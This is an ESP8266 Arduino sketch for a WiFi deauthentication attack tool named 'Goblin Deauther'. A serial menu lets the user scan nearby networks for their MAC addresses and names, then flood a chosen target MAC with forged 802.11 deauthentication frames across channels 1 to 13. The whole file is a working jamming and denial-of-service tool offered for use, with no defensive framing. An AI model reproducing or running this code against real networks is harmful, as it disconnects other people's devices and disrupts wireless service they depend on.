#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

uint8_t deauth_packet[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};

void startDeauth(String targetMAC) {
  uint8_t mac[6];
  sscanf(targetMAC.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);

  memcpy(&deauth_packet[10], mac, 6);
  memcpy(&deauth_packet[16], mac, 6);
  memcpy(&deauth_packet[4], mac, 6);

  for (int channel = 1; channel <= 13; channel++) {
    wifi_set_channel(channel);
    for (int i = 0; i < 100; i++) {
      wifi_send_pkt_freedom(deauth_packet, 26, 0);
      delay(10);
    }
  }
}

void scanNetworks() {
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    String mac = WiFi.BSSIDstr(i);
    Serial.println(mac + "|" + WiFi.SSID(i));
  }
}

void setup() {
  Serial.begin(115200);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);
}

void loop() {
  if (Serial.available() > 0) {
    String signal = Serial.readStringUntil('\n');
    signal.trim();
    
    if (signal == "!") {
      Serial.println("(#) Welcome to Goblin Deauther tool!");
      Serial.println("1. Scan networks");
      Serial.println("2. Attack network");
      Serial.println("END_MENU");

      while (!Serial.available()) delay(10);
      String input = Serial.readStringUntil('\n');
      input.trim();

      if (input == "1") {
        scanNetworks();
        Serial.println("END_SCAN");
      } else if (input == "2") {
        Serial.println("Enter target MAC:");
        Serial.println("END_PROMPT");
        
        while (!Serial.available()) delay(10);
        String target = Serial.readStringUntil('\n');
        target.trim();
        
        startDeauth(target);
        Serial.println("END_ATTACK");
      }
    }
  }
}